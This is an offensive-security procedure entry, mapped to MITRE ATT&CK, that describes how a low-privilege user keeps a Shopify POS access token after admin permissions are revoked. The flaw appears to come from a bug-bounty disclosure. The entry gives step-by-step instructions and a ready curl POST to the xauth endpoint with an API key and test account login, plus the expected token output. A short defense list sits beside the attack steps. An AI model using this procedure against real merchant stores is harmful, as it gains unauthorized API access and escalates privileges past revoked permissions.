---
id: proc-obtain-pos-token-001
tags:
  - shopify
  - pos
  - authentication
  - token
  - broken-access-control
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/shopify-pos-authenticate]]'
verified: false
platforms:
  - Web
  - Shopify
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:30:17.919Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Obtain-Persistent-POS-Access-Token

## Summary

This procedure authenticates a low-privilege user to the Shopify POS xauth endpoint to obtain an access token that persists despite revoked admin permissions, exploiting inadequate validation in the authentication flow.

## Description

After setup, the low-privilege user sends a POST request to /admin/api/xauth using the POS app's API key, login, and password. The endpoint issues a token with scopes like write_pos_channel.access without checking revoked permissions, allowing unauthorized API access. This targets Shopify's POS authentication in a web environment.

## Requirements

1. Low-privilege user credentials (email, password)
2. POS app API key from https://*.myshopify.com/admin/apps/pos
3. API client for POST requests

## Defense

Defensive measures and detection strategies:

- Validate user permissions on every token issuance
- Log and alert on token requests from low-priv accounts
- Revoke POS access synchronously with admin permissions

## Objectives

1. Demonstrate persistent authentication post-revocation
2. Obtain token for subsequent API queries
3. Enable escalation via scoped permissions

## Instructions

### Step 1: Prepare Authentication Request

**Context**: Gather credentials and API key.

Extract api_key from POS app page (e.g., a53cf2ce9b5dabf5dd222b3615c29569). Use low-priv email and password.

### Step 2: Send Authentication POST

**Context**: Request the access token via xauth endpoint.

**Command** ([[commands/shopify-pos-authenticate]]):
```bash
curl -X POST https://h1-2102-ramsexy.myshopify.com/admin/api/xauth \
  -H "Content-Type: application/json" \
  -d '{"api_key":"a53cf2ce9b5dabf5dd222b3615c29569","login":"ramsexy+h1-2102-3@wearehackerone.com","password":"███"}'
```

> This sends the JSON payload to authenticate and returns a token if successful.

**Expected Output**: {"access_token":"shpat_...","scopes":["write_pos_channel.access"],"associated_user":{"id":61357948984}}

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/shopify-pos-authenticate]]

## Tools Used


## Tags

- shopify
- pos
- authentication
